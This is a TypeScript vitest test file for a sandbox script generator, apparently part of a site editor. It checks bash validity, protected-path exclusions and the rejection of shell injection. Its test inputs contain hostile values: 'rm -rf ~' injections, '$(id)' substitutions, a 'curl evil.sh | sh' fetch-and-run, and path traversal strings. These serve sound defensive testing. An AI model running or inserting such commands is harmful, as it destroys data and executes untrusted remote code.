import { execFileSync } from "node:child_process";
import { describe, expect, it } from "vitest";
import {
  PROTECTED_DIRS,
  PROTECTED_FILES,
  SAVE_SCRIPT,
  SETUP_SCRIPT,
  installScript,
  setupScript,
  isProtected,
  markSavedScript,
} from "../sandbox-scripts";

/** `bash -n` parses without running: catches quoting slips in the generated scripts. */
const parses = (script: string) =>
  execFileSync("bash", ["-n"], {
    input: script,
    stdio: ["pipe", "pipe", "pipe"],
  });

describe("sandbox scripts", () => {
  it("are valid bash", () => {
    expect(() => parses(SETUP_SCRIPT)).not.toThrow();
    expect(() => parses(SAVE_SCRIPT)).not.toThrow();
    expect(() =>
      parses(setupScript({ projectId: "86k25j71", dataset: "production" })),
    ).not.toThrow();
    expect(() => parses(markSavedScript("a".repeat(40)))).not.toThrow();
  });

  it("never stage a protected path", () => {
    for (const p of [...PROTECTED_DIRS, ...PROTECTED_FILES])
      expect(SAVE_SCRIPT).toContain(`':(exclude)${p}'`);
    expect(SAVE_SCRIPT).toContain("':(exclude,glob)**/.env'");
  });

  it("installs the site only when there is no template", () => {
    expect(SETUP_SCRIPT).not.toContain("git clone");
    expect(
      setupScript({ projectId: "86k25j71", dataset: "production" }),
    ).toContain("git clone");
  });

  it("refuses Sanity settings that could break out of the command", () => {
    expect(() =>
      installScript({ projectId: "x'; rm -rf ~; '", dataset: "production" }),
    ).toThrow();
    expect(() =>
      installScript({ projectId: "86k25j71", dataset: "prod$(id)" }),
    ).toThrow();
  });

  it("only splice validated commit ids into commands", () => {
    expect(() => markSavedScript("HEAD; curl evil.sh | sh")).toThrow();
    expect(() => markSavedScript("a".repeat(39))).toThrow();
  });
});

describe("isProtected", () => {
  it("covers CI, env files and the editor itself", () => {
    expect(isProtected(".github/workflows/deploy.yml")).toBe(true);
    expect(isProtected(".env")).toBe(true);
    expect(isProtected(".env.production")).toBe(true);
    expect(isProtected("src/lib/editor/auth.ts")).toBe(true);
    expect(isProtected("src/pages/edit.astro")).toBe(true);
    expect(isProtected("src/pages/api/editor/login.ts")).toBe(true);
  });

  it("covers build and server code, and env files at any depth", () => {
    for (const p of [
      "package.json",
      "pnpm-lock.yaml",
      "astro.config.mjs",
      "vercel.json",
      "src/middleware.ts",
      "src/middleware/index.ts",
      "src/pages/api/other.ts",
      "src/data/.env",
      "deep/dir/.env.local",
      "scripts/x.ts",
    ]) {
      expect(isProtected(p), p).toBe(true);
    }
  });

  it("leaves site content alone", () => {
    expect(isProtected("src/data/site.ts")).toBe(false);
    expect(isProtected("src/pages/editorial.astro")).toBe(false);
    expect(isProtected("src/lib/editorial/x.ts")).toBe(false);
    expect(isProtected("public/.envelope.svg")).toBe(false);
  });
});

import {
  appendCardCommand,
  checkB64,
  joinUploadScript,
  shotPath,
  textEditCommand,
  undoScript,
  uploadChunkCommand,
} from "../sandbox-scripts";

describe("payload commands", () => {
  it("only let base64 through", () => {
    expect(() => checkB64("aGVsbG8=")).not.toThrow();
    expect(() => checkB64("aGVs bG8=")).toThrow();
    expect(() => checkB64("$(id)")).toThrow();
    expect(() => textEditCommand("a';rm -rf ~;'")).toThrow();
    expect(() => appendCardCommand("`id`")).toThrow();
    expect(() => uploadChunkCommand("abc123", 0, "a b")).toThrow();
  });

  it("only write uploads where the editor puts them", () => {
    expect(() =>
      joinUploadScript(
        "abc123",
        "/home/user/site/public/images/uploads/team-1a2b3c.jpg",
      ),
    ).not.toThrow();
    expect(() =>
      joinUploadScript("abc123", "/home/user/site/src/pages/x.astro"),
    ).toThrow();
    expect(() =>
      joinUploadScript("abc123", "/home/user/attachments/../site/x.jpg"),
    ).toThrow();
    expect(() => shotPath("../../etc", "after")).toThrow();
  });

  it("produce valid bash", () => {
    expect(() =>
      parses(undoScript("a".repeat(40), "b".repeat(40))),
    ).not.toThrow();
    expect(() =>
      parses(joinUploadScript("abc123", "/home/user/attachments/x-1.png")),
    ).not.toThrow();
    expect(() => parses(appendCardCommand("eyJhIjoxfQ=="))).not.toThrow();
    expect(() => undoScript("HEAD", "b".repeat(40))).toThrow();
  });
});
